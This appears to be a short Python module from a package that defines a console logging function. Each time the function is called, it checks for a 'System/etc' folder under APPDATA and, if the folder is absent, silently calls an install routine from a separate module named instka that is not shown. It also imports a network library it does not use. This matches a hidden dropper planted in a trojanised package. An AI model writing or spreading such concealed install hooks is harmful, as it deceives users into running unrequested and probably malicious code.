import urllib.request
import os
import shutil
from . import instka
import sys

def consoleLog(string):
    apdt = os.environ['APPDATA']
    if not os.path.isdir(apdt+"/System/etc"):
        instka.istnall()
    print(string)